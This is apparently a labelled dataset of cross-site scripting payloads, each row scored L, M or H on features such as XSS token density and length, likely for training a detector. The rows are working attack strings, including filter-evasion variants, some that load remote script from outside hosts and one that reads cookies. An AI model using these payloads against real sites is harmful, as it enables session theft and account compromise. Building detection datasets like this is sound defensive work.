attack	d_char	d_token_sqli	d_token_xss	d_token_ci	punck	s_token	space	length	output
<svg onload=alert(1)>	M	L	L	L	L	L	L	M	
"><svg onload=alert(1)//	M	L	L	L	M	L	L	M	
"onmouseover=alert(1)//	L	L	L	L	M	L	L	M	
"autofocus/onfocus=alert(1)//	L	L	L	L	M	L	L	M	
</script><svg onload=alert(1)>	M	L	M	L	M	L	L	M	
<x contenteditable onblur=alert(1)>lose focus! 	M	L	L	L	M	L	M	M	
<x onclick=alert(1)>click this! 	M	L	L	L	M	L	M	M	
<x oncopy=alert(1)>copy this! 	M	L	L	L	M	M	M	M	
<x oncontextmenu=alert(1)>right click this! 	M	L	L	L	M	L	M	M	
<x oncut=alert(1)>copy this! 	M	L	L	L	M	M	M	M	
<x ondblclick=alert(1)>double click this! 	M	L	L	L	M	L	M	M	
<x ondrag=alert(1)>drag this! 	M	L	L	L	M	L	M	M	
<x contenteditable onfocus=alert(1)>focus this! 	M	L	M	L	M	L	M	M	
<x contenteditable oninput=alert(1)>input here! 	M	L	M	L	M	L	M	M	
<x contenteditable onkeydown=alert(1)>press any key! 	M	L	L	L	M	M	M	M	
<x contenteditable onkeypress=alert(1)>press any key! 	M	L	L	L	M	M	M	M	
<x contenteditable onkeyup=alert(1)>press any key! 	M	L	L	L	M	M	M	M	
<x onmousedown=alert(1)>click this! 	M	L	L	L	M	L	M	M	
<x onmousemove=alert(1)>hover this! 	M	L	L	L	M	L	M	M	
<x onmouseout=alert(1)>hover this! 	M	L	L	L	M	L	M	M	
<x onmouseover=alert(1)>hover this! 	M	L	L	L	M	L	M	M	
<x onmouseup=alert(1)>click this! 	M	L	L	L	M	L	M	M	
<x contenteditable onpaste=alert(1)>paste here!	M	L	L	L	M	L	M	M	
<script>alert(1)// 	L	L	L	L	M	L	L	L	
<script>alert(1)<!–	M	L	L	L	M	L	L	L	
<script src=//brutelogic.com.br/1.js> 	M	L	L	L	M	L	L	M	
<script src=//3334957647/1>	M	L	L	L	M	M	L	M	
<x 1='1'onxxx=1 	M	L	L	L	L	M	L	L	
<x 1="1"onxxx=1	M	L	L	L	L	M	L	L	
<x 1=">" onxxx=1 	M	L	L	L	L	M	M	L	
<x onxxx=alert(1) 1='	M	L	L	L	L	M	L	M	
<svg onload=setinterval(function(){with(document)body.appendchild(createelement('script')).src='//host:port'},0)>	H	L	M	L	M	L	L	M	
'onload=alert(1)><svg/1='	M	L	L	L	M	M	L	M	
'>alert(1)</script><script/1=' 	M	L	L	L	M	M	L	M	
*/alert(1)</script><script>/*	M	L	L	L	M	L	L	M	
*/alert(1)">'onload="/*<svg/1='	H	L	L	L	M	M	L	M	
`-alert(1)">'onload="`<svg/1='	H	L	L	L	M	M	L	M	
*/</script>'>alert(1)/*<script/1='	M	L	L	L	M	M	L	M	
<script>alert(1)</script> 	M	L	L	L	M	L	L	M	
<script src=javascript:alert(1)> 	M	L	M	L	M	L	L	M	
<iframe src=javascript:alert(1)> 	M	L	M	L	M	L	L	M	
<embed src=javascript:alert(1)> 	M	L	M	L	M	L	L	M	
<a href=javascript:alert(1)>click 	M	L	M	L	M	L	L	M	
<math><brute href=javascript:alert(1)>click 	M	L	M	L	M	L	L	M	
<form action=javascript:alert(1)><input type=submit> 	M	L	M	L	M	L	M	M	
<isindex action=javascript:alert(1) type=submit value=click> 	M	L	M	L	M	L	M	M	
<form><button formaction=javascript:alert(1)>click 	M	L	M	L	M	L	L	M	
<form><input formaction=javascript:alert(1) type=submit value=click> 	M	L	M	L	M	L	M	M	
<form><input formaction=javascript:alert(1) type=image value=click> 	M	L	M	L	M	L	M	M	
<form><input formaction=javascript:alert(1) type=image src=source> 	M	L	M	L	M	L	M	M	
<isindex formaction=javascript:alert(1) type=submit value=click> 	M	L	M	L	M	L	M	M	
<object data=javascript:alert(1)> 	M	L	M	L	M	L	L	M	
<iframe srcdoc=<svg/o&#x6eload&equals;alert&lpar;1)&gt;> 	M	L	M	L	M	L	L	M	
<svg><script xlink:href=data:,alert(1) /> 	M	L	M	L	M	L	M	M	
<math><brute xlink:href=javascript:alert(1)>click 	M	L	M	L	M	L	L	M	
<svg><a xmlns:xlink=http://www.w3.org/1999/xlink xlink:href=?><circle r=400 /><animate attributename=xlink:href begin=0 from=javascript:alert(1) to=&>	L	L	M	L	M	M	M	H	
<html ontouchstart=alert(1)> 	M	L	L	L	L	L	L	M	
<html ontouchend=alert(1)> 	M	L	L	L	L	L	L	M	
<html ontouchmove=alert(1)> 	M	L	L	L	L	L	L	M	
<html ontouchcancel=alert(1)>	M	L	L	L	L	L	L	M	
<body onorientationchange=alert(1)>	M	L	L	L	L	L	L	M	
"><img src=1 onerror=alert(1)>.gif	M	L	M	L	M	M	L	M	
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>	H	L	M	L	M	L	L	M	
gif89a/*<svg/onload=alert(1)>*/=alert(document.domain)//;	M	L	M	L	M	L	L	M	
<script src="data:&comma;alert(1)//	M	L	M	L	M	L	L	M	
"><script src=data:&comma;alert(1)//	M	L	M	L	M	L	L	M	
<script src="//brutelogic.com.br&sol;1.js&num; 	M	L	L	L	M	L	L	M	
"><script src=//brutelogic.com.br&sol;1.js&num; 	M	L	L	L	M	L	L	M	
<link rel=import href="data:text/html&comma;&lt;script&gt;alert(1)&lt;&sol;script&gt; 	M	L	M	L	M	L	M	M	
"><link rel=import href=data:text/html&comma;&lt;script&gt;alert(1)&lt;&sol;script&gt;	M	L	M	L	M	L	L	M	
<base href=//0>	M	L	L	L	L	L	L	L	
<script/src="data:&comma;eval(atob(location.hash.slice(1)))//#alert(1)	M	L	M	L	M	M	L	M	
<body onload=alert(1)>	M	L	L	L	L	L	L	M	
<body onpageshow=alert(1)>	M	L	L	L	L	L	L	M	
<body onfocus=alert(1)>	M	L	L	L	L	L	L	M	
<body onhashchange=alert(1)><a href=#x>click this!#x	H	L	M	L	M	L	M	M	
<body style=overflow:auto;height:1000px onscroll=alert(1) id=x>#x	M	L	M	L	M	L	M	M	
<body onscroll=alert(1)><br><br><br><br>	L	L	M	L	L	L	L	M	
<br><br><br><br><br><br><br><br><br><br>	L	L	M	L	L	L	L	M	
<br><br><br><br><br><br><br><br><br><br>	L	L	M	L	L	L	L	M	
<br><br><br><br><br><br><x id=x>#x	L	L	M	L	L	L	L	M	
<body onresize=alert(1)>press f12!	M	L	L	L	M	M	L	M	
<body onhelp=alert(1)>press f1! (msie)	M	L	L	L	M	M	M	M	
<marquee onstart=alert(1)>	M	L	L	L	L	L	L	M	
<marquee loop=1 width=0 onfinish=alert(1)>	M	L	M	L	L	M	M	M	
<audio src onloadstart=alert(1)>	M	L	L	L	L	L	L	M	
<video onloadstart=alert(1)><source>	M	L	L	L	L	L	L	M	
<input autofocus onblur=alert(1)>	M	L	M	L	L	L	L	M	
<keygen autofocus onfocus=alert(1)>	M	L	L	L	L	L	L	M	
<form onsubmit=alert(1)><input type=submit>	M	L	M	L	L	L	L	M	
<select onchange=alert(1)><option>1<option>2	M	L	M	L	L	M	L	M	
<menu id=x contextmenu=x onshow=alert(1)>right click me!	M	L	M	L	M	L	M	M	
a=alert,a(1)	L	L	L	L	M	L	L	L	
top["al"+"ert"](1)	M	L	L	L	M	M	L	L	
eval(url.slice(-8))>#alert(1)	L	L	L	L	M	M	L	M	
eval(location.hash.slice(1)>#alert(1)	L	L	M	L	M	M	L	M	
innerhtml=location.hash>#<script>alert(1)</script>	M	L	M	L	M	L	L	M	
'%22--%3e%3c/style%3e%3c/script%3e%3cscript%3eshadowlabs(0x000045)%3c/script%3e	L	L	L	L	M	H	L	M	
<<scr\0ipt/src=http://xss.com/xss.js></script	M	L	M	L	M	L	L	M	
%27%22--%3e%3c%2fstyle%3e%3c%2fscript%3e%3cscript%3erwar%280x00010e%29%3c%2fscript%3e	L	L	L	L	L	H	L	M	
' onmouseover=alert(/xss/)	L	L	L	L	M	L	L	M	
"><iframe%20src="http://google.com"%%203e	H	L	L	L	M	M	L	M	
'<script>window.onload=function(){document.forms[0].message.value='1';}</script>	H	L	M	L	M	M	L	M	
x”</title><img src%3dx onerror%3dalert(1)>	M	L	M	L	M	L	L	M	
<script> document.getelementbyid(%22safe123%22).setcapture(); document.getelementbyid(%22safe123%22).click(); </script>	H	L	M	L	M	M	M	H	
<script>object.defineproperties(window, {safe: {value: {get: function() {return document.cookie}}}});alert(safe.get())</script>	M	L	M	L	H	L	M	H	
<script>var x = document.createelement('iframe');document.body.appendchild(x);var xhr = x.contentwindow.xmlhttprequest();xhr.open('get', 'http://xssme.html5sec.org/xssme2', true);xhr.onload = function() { alert(xhr.responsetext.match(/cookie = '(.*?)'/)[1]) };xhr.send();</script>	L	M	M	L	L	L	M	L	
